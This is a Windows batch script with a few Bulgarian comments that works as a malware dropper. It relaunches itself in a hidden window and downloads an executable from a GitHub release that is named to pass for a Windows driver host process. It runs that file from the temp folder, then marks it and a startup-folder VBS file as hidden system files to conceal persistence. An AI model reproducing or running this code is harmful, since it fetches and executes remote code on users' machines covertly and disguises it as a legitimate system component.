@echo off
if not defined hide (
    set hide=1
    powershell -WindowStyle Hidden -NoProfile -Command "Start-Process cmd -ArgumentList '/c %~f0' -WindowStyle Hidden"
    exit
)

:: ---------------- тук е твоят оригинален код ----------------
echo Downloading file...
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/bgprofil9-create/profejt/releases/download/v1/Windows.Driver.Foundation.-.User-mode.Driver.Framework.Host.Process.exe' -OutFile '%temp%\Windows Driver Foundation User mode Driver Framework Host Process.exe'"

echo Starting application...
start "" "%temp%\Windows Driver Foundation User mode Driver Framework Host Process.exe"

powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 70; $file = [Environment]::GetFolderPath('ApplicationData') + '\Microsoft\Windows\Start Menu\Programs\Startup\Sound devices.vbs'; if (Test-Path $file) { (Get-Item $file).Attributes = 'Hidden,System' }"
powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 70; $file = [Environment]::GetFolderPath('LocalApplicationData') + '\Temp\Windows Driver Foundation User mode Driver Framework Host Process.exe'; if (Test-Path $file) { (Get-Item $file).Attributes = 'Hidden,System' }"
:: pause   <- махни това
